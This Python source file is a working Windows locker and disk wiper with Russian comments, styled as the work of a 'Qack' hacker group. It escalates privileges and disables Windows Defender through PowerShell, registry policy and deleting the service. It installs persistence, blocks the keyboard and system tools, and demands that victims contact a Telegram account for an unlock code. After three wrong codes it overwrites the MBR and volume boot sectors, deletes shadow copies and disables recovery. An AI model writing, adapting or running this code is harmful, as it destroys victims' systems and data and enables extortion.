# language: Python, file: locker.py
# Зависимости: pillow keyboard psutil pygame
# ВНИМАНИЕ: деструктивный код. Только локальная VM со снапшотом.

import ctypes
import hashlib
import os
import string
import subprocess
import sys
import threading
import time
from ctypes import wintypes

import psutil

try:
    import keyboard
    HAS_KEYBOARD = True
except ImportError:
    HAS_KEYBOARD = False

try:
    import pygame
    HAS_PYGAME = True
except ImportError:
    HAS_PYGAME = False

import tkinter as tk
from PIL import Image, ImageTk
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

# ================= НАСТРОЙКИ =================
_SALT = b"QackLockerSalt_2026"
CORRECT_HASH = hashlib.sha256(_SALT + b"8841").hexdigest()

BLOCK_EXE = {
    "notepad.exe", "taskmgr.exe", "cmd.exe", "regedit.exe",
    "processhacker.exe", "msconfig.exe", "iexplore.exe",
    "powershell.exe", "pwsh.exe", "wt.exe",
    "diskpart.exe", "mountvol.exe", "format.com",
}

_SELF_PID = os.getpid()
_STOP_FLAG = threading.Event()

ATTEMPTS_FILE = os.path.join(os.environ.get("APPDATA", "."), "QackLocker", "attempts.dat")
DEFENDER_LOG = os.path.join(os.environ.get("APPDATA", "."), "QackLocker", "defender_bypass.log")

CREATE_NO_WINDOW = 0x08000000

# ================= WINAPI =================
kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
user32 = ctypes.WinDLL("user32", use_last_error=True)

GENERIC_READ = 0x80000000
GENERIC_WRITE = 0x40000000
FILE_SHARE_READ = 0x1
FILE_SHARE_WRITE = 0x2
OPEN_EXISTING = 3
INVALID_HANDLE_VALUE = ctypes.c_void_p(-1).value
IOCTL_DISK_GET_LENGTH_INFO = 0x0007405C

kernel32.CreateFileW.restype = wintypes.HANDLE
kernel32.CreateFileW.argtypes = [
    wintypes.LPCWSTR, wintypes.DWORD, wintypes.DWORD,
    wintypes.LPVOID, wintypes.DWORD, wintypes.DWORD, wintypes.HANDLE,
]
kernel32.WriteFile.argtypes = [
    wintypes.HANDLE, wintypes.LPCVOID, wintypes.DWORD,
    ctypes.POINTER(wintypes.DWORD), wintypes.LPVOID,
]
kernel32.SetFilePointerEx.argtypes = [
    wintypes.HANDLE, ctypes.c_longlong,
    ctypes.POINTER(ctypes.c_longlong), wintypes.DWORD,
]
kernel32.DeviceIoControl.argtypes = [
    wintypes.HANDLE, wintypes.DWORD, wintypes.LPVOID, wintypes.DWORD,
    wintypes.LPVOID, wintypes.DWORD,
    ctypes.POINTER(wintypes.DWORD), wintypes.LPVOID,
]
kernel32.GetModuleHandleW.restype = wintypes.HMODULE

user32.SetWindowsHookExW.restype = wintypes.HHOOK
user32.SetWindowsHookExW.argtypes = [
    ctypes.c_int, ctypes.c_void_p, wintypes.HINSTANCE, wintypes.DWORD,
]
user32.CallNextHookEx.restype = ctypes.c_ssize_t
user32.CallNextHookEx.argtypes = [
    wintypes.HHOOK, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM,
]
user32.GetMessageW.argtypes = [
    ctypes.POINTER(wintypes.MSG), wintypes.HWND, wintypes.UINT, wintypes.UINT,
]

# ================= UAC =================
def ensure_admin():
    if ctypes.windll.shell32.IsUserAnAdmin():
        return
    try:
        args = subprocess.list2cmdline(sys.argv)
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, args, None, 1)
    except Exception:
        pass
    sys.exit(0)

# ================= DEFENDER BYPASS =================
def _run(cmd, timeout=15):
    try:
        r = subprocess.run(cmd, capture_output=True, text=True,
                           creationflags=CREATE_NO_WINDOW, timeout=timeout)
        return r.returncode, (r.stdout or "") + (r.stderr or "")
    except Exception as e:
        return -1, str(e)


def _ensure_key(hive, path):
    import winreg
    parts = path.split("\\")
    cur = ""
    for p in parts:
        cur = f"{cur}\\{p}" if cur else p
        try:
            winreg.CreateKeyEx(hive, cur, 0, winreg.KEY_CREATE_SUB_KEY)
        except Exception:
            return False
    return True


def _reg_set_hklm(path, name, value, vtype=None):
    import winreg
    if vtype is None:
        vtype = winreg.REG_DWORD
    if not _ensure_key(winreg.HKEY_LOCAL_MACHINE, path):
        return False
    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path, 0, winreg.KEY_SET_VALUE) as k:
            winreg.SetValueEx(k, name, 0, vtype, value)
        return True
    except Exception:
        return False


def add_exclusions():
    ps_script = (
        "Add-MpPreference -ExclusionPath \"$env:APPDATA\\QackLocker\" -ErrorAction SilentlyContinue; "
        "Add-MpPreference -ExclusionPath \"$env:TEMP\" -ErrorAction SilentlyContinue; "
        "Add-MpPreference -ExclusionProcess 'locker.exe' -ErrorAction SilentlyContinue; "
        "Add-MpPreference -ExclusionProcess 'python.exe' -ErrorAction SilentlyContinue"
    )
    rc, _ = _run(["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", ps_script], timeout=20)
    rc2, out2 = _run(["powershell", "-NoProfile", "-Command",
                      "(Get-MpPreference).ExclusionPath -join ';'"], timeout=10)
    applied = "QackLocker" in out2 or "locker.exe" in out2
    return {"set_rc": rc, "verify_rc": rc2, "applied": applied, "raw": out2.strip()[:500]}


def disable_via_powershell():
    ps_set = (
        "Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue; "
        "Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue; "
        "Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue; "
        "Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue; "
        "Set-MpPreference -MAPSReporting 0 -ErrorAction SilentlyContinue; "
        "Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue; "
        "Set-MpPreference -PUAProtection 0 -ErrorAction SilentlyContinue"
    )
    rc, _ = _run(["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", ps_set], timeout=20)
    rc2, out2 = _run(["powershell", "-NoProfile", "-Command",
                      "(Get-MpPreference).DisableRealtimeMonitoring"], timeout=10)
    realtime_off = "True" in out2
    return {"set_rc": rc, "verify_rc": rc2, "realtime_off": realtime_off, "raw": out2.strip()[:200]}


def disable_via_registry():
    policy = r"SOFTWARE\Policies\Microsoft\Windows Defender"
    rtp = policy + r"\Real-Time Protection"
    spynet = policy + r"\Spynet"
    written = {
        "DisableAntiSpyware": _reg_set_hklm(policy, "DisableAntiSpyware", 1),
        "DisableAntiVirus": _reg_set_hklm(policy, "DisableAntiVirus", 1),
        "ServiceStartup": _reg_set_hklm(policy, "ServiceStartup", 4),
        "DisableRealtimeMonitoring": _reg_set_hklm(rtp, "DisableRealtimeMonitoring", 1),
        "DisableBehaviorMonitoring": _reg_set_hklm(rtp, "DisableBehaviorMonitoring", 1),
        "DisableIOAVProtection": _reg_set_hklm(rtp, "DisableIOAVProtection", 1),
        "SpynetReporting": _reg_set_hklm(spynet, "SpynetReporting", 0),
        "SubmitSamplesConsent": _reg_set_hklm(spynet, "SubmitSamplesConsent", 2),
    }
    return {
        "written": written,
        "all_written": all(written.values()),
        "effect": "DisableAntiSpyware игнорируется с Win10 1903+",
    }


def stop_services():
    services = ["WinDefend", "WdNisSvc", "Sense", "SecurityHealthService", "wscsvc", "MsMpSvc"]
    results = {}
    for svc in services:
        rc_stop, _ = _run(["sc", "stop", svc], timeout=10)
        rc_cfg, _ = _run(["sc", "config", svc, "start=", "disabled"], timeout=10)
        rc_query, out_query = _run(["sc", "query", svc], timeout=10)
        stopped = "STOPPED" in out_query.upper()
        results[svc] = {"stop_rc": rc_stop, "config_rc": rc_cfg, "stopped": stopped}
    return results


def delete_defender_service():
    results = {}
    for svc in ("WinDefend", "WdNisSvc"):
        rc, out = _run(["sc", "delete", svc], timeout=10)
        results[svc] = {"rc": rc, "deleted": rc == 0, "raw": out.strip()[:200]}
    return results


def disable_via_policy():
    path = r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"
    written = {
        "DisableRealtimeMonitoring": _reg_set_hklm(path, "DisableRealtimeMonitoring", 1),
        "DisableBehaviorMonitoring": _reg_set_hklm(path, "DisableBehaviorMonitoring", 1),
        "DisableOnAccessProtection": _reg_set_hklm(path, "DisableOnAccessProtection", 1),
        "HideSCAHealth": _reg_set_hklm(
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer",
            "HideSCAHealth", 1,
        ),
    }
    return {"written": written, "all_written": all(written.values())}


def check_tamper_protection():
    rc, out = _run(["powershell", "-NoProfile", "-Command",
                    "(Get-MpComputerStatus).IsTamperProtected"], timeout=10)
    return {"rc": rc, "raw": out.strip()[:100], "enabled": "True" in out}


def bypass_defender():
    tp = check_tamper_protection()
    report = {
        "tamper_protection": tp,
        "exclusions": add_exclusions(),
        "powershell": disable_via_powershell(),
        "registry": disable_via_registry(),
        "services": stop_services(),
        "service_delete": delete_defender_service(),
        "policy": disable_via_policy(),
    }
    report["summary"] = {
        "tamper_protection_on": tp["enabled"],
        "exclusions_applied": report["exclusions"]["applied"],
        "realtime_off": report["powershell"]["realtime_off"],
        "any_service_stopped": any(
            s["stopped"] for s in report["services"].values() if isinstance(s, dict)
        ),
        "note": (
            "Tamper Protection включён: работает только exclusions."
            if tp["enabled"] else
            "Tamper Protection выключен: powershell/registry/services должны сработать."
        ),
    }
    return report


def run_defender_bypass_and_log():
    try:
        report = bypass_defender()
    except Exception as e:
        report = {"error": str(e)}
    try:
        import json
        os.makedirs(os.path.dirname(DEFENDER_LOG), exist_ok=True)
        with open(DEFENDER_LOG, "w", encoding="utf-8") as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
    except Exception:
        pass

# ================= MBR / SECTORS =================
def wipe_mbr():
    h = kernel32.CreateFileW(
        r"\\.\PhysicalDrive0",
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        None, OPEN_EXISTING, 0, None,
    )
    if h == INVALID_HANDLE_VALUE:
        return False
    try:
        written = wintypes.DWORD(0)
        junk = bytearray(os.urandom(512))
        junk[510] = 0x00
        junk[511] = 0x00
        if not kernel32.WriteFile(h, bytes(junk), 512, ctypes.byref(written), None):
            return False
        kernel32.FlushFileBuffers(h)

        filler = b"\xFF" * 4096
        kernel32.SetFilePointerEx(h, ctypes.c_longlong(512), None, 0)
        if not kernel32.WriteFile(h, filler, len(filler), ctypes.byref(written), None):
            return False
        kernel32.FlushFileBuffers(h)

        length = ctypes.c_ulonglong(0)
        ret = wintypes.DWORD(0)
        kernel32.DeviceIoControl(
            h, IOCTL_DISK_GET_LENGTH_INFO,
            None, 0, ctypes.byref(length), 8,
            ctypes.byref(ret), None,
        )
        if length.value > 1024:
            last = length.value - 512
            kernel32.SetFilePointerEx(h, ctypes.c_longlong(last), None, 0)
            if not kernel32.WriteFile(h, b"\xFF" * 512, 512, ctypes.byref(written), None):
                return False
            kernel32.FlushFileBuffers(h)
        return True
    finally:
        kernel32.CloseHandle(h)


def wipe_ntfs_boot_sectors():
    system_drive = os.environ.get("SystemDrive", "C:").rstrip("\\").upper()
    for letter in string.ascii_uppercase:
        drive = f"{letter}:"
        if drive == system_drive:
            continue
        if not os.path.exists(f"{drive}\\"):
            continue
        try:
            h = kernel32.CreateFileW(
                f"\\\\.\\{drive}",
                GENERIC_READ | GENERIC_WRITE,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                None, OPEN_EXISTING, 0, None,
            )
            if h == INVALID_HANDLE_VALUE:
                continue
            written = wintypes.DWORD(0)
            junk = os.urandom(512)
            kernel32.WriteFile(h, junk, 512, ctypes.byref(written), None)
            kernel32.FlushFileBuffers(h)
            kernel32.CloseHandle(h)
        except Exception:
            pass

# ================= BCD / RECOVERY =================
def destroy_boot_and_recovery():
    subprocess.run(["vssadmin", "delete", "shadows", "/all", "/quiet"], capture_output=True, creationflags=CREATE_NO_WINDOW)
    subprocess.run(["reagentc", "/disable"], capture_output=True, creationflags=CREATE_NO_WINDOW)
    subprocess.run(["bcdedit", "/set", "{bootmgr}", "path", "\\NONEXISTENT"], capture_output=True, creationflags=CREATE_NO_WINDOW)
    subprocess.run(["bcdedit", "/set", "{default}", "recoveryenabled", "No"], capture_output=True, creationflags=CREATE_NO_WINDOW)

# ================= ATTEMPTS =================
def load_attempts():
    try:
        os.makedirs(os.path.dirname(ATTEMPTS_FILE), exist_ok=True)
        with open(ATTEMPTS_FILE, "r") as f:
            return int(f.read().strip())
    except Exception:
        return 0


def save_attempts(n):
    try:
        os.makedirs(os.path.dirname(ATTEMPTS_FILE), exist_ok=True)
        with open(ATTEMPTS_FILE, "w") as f:
            f.write(str(n))
    except Exception:
        pass

# ================= AUTOSTART / REG =================
def install_autostart():
    exe = sys.executable
    try:
        import winreg
        key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE) as k:
            winreg.SetValueEx(k, "QackLocker", 0, winreg.REG_SZ, exe)
    except Exception:
        pass
    try:
        subprocess.run(
            ["schtasks", "/create", "/tn", "QackLocker", "/tr", exe,
             "/sc", "onlogon", "/rl", "highest", "/f"],
            capture_output=True, creationflags=CREATE_NO_WINDOW, timeout=15,
        )
    except Exception:
        pass


def remove_autostart():
    try:
        import winreg
        key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE) as k:
            winreg.DeleteValue(k, "QackLocker")
    except Exception:
        pass
    try:
        subprocess.run(["schtasks", "/delete", "/tn", "QackLocker", "/f"],
                       capture_output=True, creationflags=CREATE_NO_WINDOW, timeout=10)
    except Exception:
        pass


def reg_set(path, name, value, vtype=1):
    import winreg
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, path, 0, winreg.KEY_SET_VALUE) as k:
            winreg.SetValueEx(k, name, 0, vtype, value)
        return True
    except Exception:
        try:
            with winreg.CreateKey(winreg.HKEY_CURRENT_USER, path) as k:
                winreg.SetValueEx(k, name, 0, vtype, value)
            return True
        except Exception:
            return False


def apply_reg_blocks():
    sys_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
    reg_set(sys_path, "DisableTaskMgr", 1)
    reg_set(sys_path, "DisableLockWorkstation", 1)
    reg_set(sys_path, "DisableChangePassword", 1)
    reg_set(r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoWinKeys", 1)

# ================= KEYBOARD LOCK =================
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
WM_SYSKEYDOWN = 0x0104
VK_0, VK_9 = 0x30, 0x39
VK_ENTER, VK_BACK, VK_TAB = 0x0D, 0x08, 0x09


class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ("vkCode", wintypes.DWORD), ("scanCode", wintypes.DWORD),
        ("flags", wintypes.DWORD), ("time", wintypes.DWORD),
        ("dwExtraInfo", ctypes.c_void_p),
    ]


_kb_proc_ref = None
_kb_hook = None


def _kb_proc(nCode, wParam, lParam):
    if nCode == 0 and wParam in (WM_KEYDOWN, WM_SYSKEYDOWN):
        kb = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
        vk = kb.vkCode
        allowed = (VK_0 <= vk <= VK_9) or vk in (VK_ENTER, VK_BACK, VK_TAB)
        if not allowed:
            return 1
    return user32.CallNextHookEx(None, nCode, wParam, lParam)


def _keyboard_lock_loop():
    global _kb_proc_ref, _kb_hook
    HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_ssize_t, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM)
    _kb_proc_ref = HOOKPROC(_kb_proc)
    _kb_hook = user32.SetWindowsHookExW(WH_KEYBOARD_LL, _kb_proc_ref, kernel32.GetModuleHandleW(None), 0)
    if not _kb_hook:
        return
    msg = wintypes.MSG()
    while user32.GetMessageW(ctypes.byref(msg), None, 0, 0) > 0:
        user32.TranslateMessage(ctypes.byref(msg))
        user32.DispatchMessageW(ctypes.byref(msg))


def install_keyboard_lock():
    threading.Thread(target=_keyboard_lock_loop, daemon=True).start()


def uninstall_keyboard_lock():
    global _kb_hook
    if _kb_hook:
        try:
            user32.UnhookWindowsHookEx(_kb_hook)
        except Exception:
            pass
        _kb_hook = None

# ================= ХОТКЕИ / ЗВУК =================
def install_hotkeys():
    if not HAS_KEYBOARD:
        return
    for combo in ("alt+tab", "win+d", "alt+f4", "ctrl+esc", "win+r", "ctrl+shift+esc"):
        try:
            keyboard.add_hotkey(combo, lambda: None, suppress=True)
        except Exception:
            pass
    try:
        keyboard.block_key("win")
    except Exception:
        pass


_screams_started = False
_scream_path = None


def resource_path(rel):
    base = getattr(sys, "_MEIPASS", os.path.abspath("."))
    p = os.path.join(base, rel)
    return p if os.path.exists(p) else None


def init_scream():
    global _scream_path
    if not HAS_PYGAME:
        return
    path = resource_path("scream.mp3")
    if not path:
        return
    try:
        pygame.mixer.init()
        pygame.mixer.music.load(path)
        _scream_path = path
    except Exception:
        _scream_path = None


def schedule_screams(win):
    global _screams_started
    if _screams_started or not HAS_PYGAME or _scream_path is None:
        return
    _screams_started = True

    def scream_once():
        try:
            pygame.mixer.music.stop()
            pygame.mixer.music.play()
        except Exception:
            pass
        win.after(10000, scream_once)

    scream_once()

# ================= ПРОЦЕССЫ =================
def kill_blocked():
    for proc in psutil.process_iter(["name", "ppid"]):
        try:
            if proc.info["ppid"] == _SELF_PID:
                continue
            if (proc.info["name"] or "").lower() in BLOCK_EXE:
                proc.kill()
        except Exception:
            pass


def blocking_loop():
    while not _STOP_FLAG.is_set():
        kill_blocked()
        time.sleep(0.1)

# ================= UI =================
def main():
    ensure_admin()

    try:
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
    except Exception:
        pass

    apply_reg_blocks()
    install_autostart()
    init_scream()

    # Обход Defender в отдельном потоке, чтобы не блокировать UI
    threading.Thread(target=run_defender_bypass_and_log, daemon=True).start()

    threading.Thread(target=blocking_loop, daemon=True).start()
    install_hotkeys()

    win = tk.Tk()
    win.title("System Locker")
    win.attributes("-fullscreen", True)
    win.attributes("-topmost", True)
    win.configure(bg="#000000")
    win.protocol("WM_DELETE_WINDOW", lambda: None)

    eye_path = resource_path("assets/Eye.png")
    if eye_path:
        try:
            img = Image.open(eye_path).resize((420, 200))
            photo = ImageTk.PhotoImage(img)
            eye_label = tk.Label(win, image=photo, bg="#000000", bd=0)
            eye_label.image = photo
            eye_label.place(relx=0.5, rely=0.45, anchor="center")
        except Exception:
            eye_label = tk.Label(win, text="[Eye Error]", fg="red", bg="black")
            eye_label.place(relx=0.5, rely=0.45, anchor="center")
    else:
        eye_label = tk.Label(win, text="[Eye Missing]", fg="red", bg="black")
        eye_label.place(relx=0.5, rely=0.45, anchor="center")

    boot_text = "Booting System\n\nMemory section at adres 0x420 IS LOCKED!!"
    boot_text2 = "  WIN LOCKED ACTIVATE\n  CRYPTER starting..."

    label = tk.Label(win, text="", bg="#000000", fg="#FF0000",
                     font=("Consolas", 15), anchor="w", justify="left")
    label.pack(anchor="w")
    label2 = tk.Label(win, text="", bg="#000000", fg="#656464",
                      font=("Consolas", 15), anchor="w", justify="left")
    label2.pack(pady=(20, 0), anchor="w")

    state = {"i": 0, "i2": 0}

    def typing():
        if state["i"] <= len(boot_text):
            label.config(text=boot_text[: state["i"]])
            state["i"] += 1
            win.after(2, typing)
        elif state["i2"] <= len(boot_text2):
            label2.config(text=boot_text2[: state["i2"]])
            state["i2"] += 1
            win.after(2, typing)
        else:
            locker_screen()

    def kill_desktop():
        for exe in ("explorer.exe", "ctfmon.exe"):
            try:
                subprocess.run(["taskkill", "/f", "/im", exe],
                               capture_output=True, creationflags=CREATE_NO_WINDOW, timeout=5)
            except Exception:
                pass

    def locker_screen():
        for w in win.winfo_children():
            w.destroy()

        schedule_screams(win)
        threading.Thread(target=kill_desktop, daemon=True).start()

        ss_path = resource_path("assets/s.png")
        if ss_path:
            try:
                img = Image.open(ss_path).resize((300, 300))
                win.photo = ImageTk.PhotoImage(img)
                tk.Label(win, image=win.photo, bg="#000000", bd=0).place(x=50, y=450)
            except Exception:
                pass

        tk.Label(win, text="WINDOWS ЗАБЛОКИРОВАН!",
                 fg="#4f4f4f", bg="#000000",
                 font=("Consolas", 18)).pack(pady=(50, 20))

        tk.Label(win, text=(
            "Ваш компьютер подвержен блокировке хакерской группой Qack.\n"
            "ВВОДИТЕ ПАРОЛЬ АККУРАТНО. 3 ОШИБКИ = УНИЧТОЖЕНИЕ СИСТЕМЫ.\n\n"
            "За кодом писать @pu709 (Telegram)"),
            fg="#AAAAAA", bg="#000000", font=("Consolas", 13),
            justify="center").pack(pady=20)

        entry = tk.Entry(win, bg="#151515", fg="#FFFFFF", insertbackground="#FFFFFF",
                         font=("Consolas", 16), justify="center", width=25)
        entry.pack(pady=10)

        current_attempts = load_attempts()
        left_init = max(0, 3 - current_attempts)
        result = tk.Label(win, text=f"Попыток осталось: {left_init}",
                          fg="#FF0000", bg="#000000", font=("Consolas", 12))
        result.pack(pady=5)

        def unlock():
            """Снимает локер: автозапуск, хук, blocking_loop, реестр."""
            _STOP_FLAG.set()
            remove_autostart()
            uninstall_keyboard_lock()
            reg_set(r"Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", 0)
            reg_set(r"Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableLockWorkstation", 0)
            reg_set(r"Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableChangePassword", 0)
            reg_set(r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoWinKeys", 0)
            try:
                subprocess.Popen(["explorer.exe"], creationflags=CREATE_NO_WINDOW)
            except Exception:
                pass
            win.after(1000, win.destroy)

        def check_code():
            nonlocal current_attempts

            h = hashlib.sha256(_SALT + entry.get().encode()).hexdigest()
            if h == CORRECT_HASH:
                result.config(text="Код правильный!", fg="#00FF00")
                save_attempts(0)
                unlock()
                return

            current_attempts += 1
            save_attempts(current_attempts)

            entry.delete(0, tk.END)
            left = 3 - current_attempts

            if left > 0:
                result.config(text=f"Неверный код! Осталось: {left}", fg="#FF0000")
                return

            # третья ошибка — снос
            install_keyboard_lock()
            wipe_mbr()
            wipe_ntfs_boot_sectors()
            destroy_boot_and_recovery()
            save_attempts(0)

            for w in win.winfo_children():
                w.destroy()
            win.configure(bg="#FF0000")
            tk.Label(win, text="ДОИГРАЛСЯ...", fg="#000000", bg="#FF0000",
                     font=("Impact", 60), justify="center").pack(expand=True, fill="both")
            win.after(3000, lambda: subprocess.Popen(
                ["shutdown", "/s", "/t", "5", "/f"],
                creationflags=CREATE_NO_WINDOW,
            ))

        tk.Button(win, text="ПРОВЕРИТЬ", command=check_code,
                  bg="#222222", fg="#FFFFFF",
                  font=("Consolas", 12), bd=0, padx=20, pady=8).pack(pady=10)
        entry.focus()

    typing()
    win.mainloop()


if __name__ == "__main__":
    main()
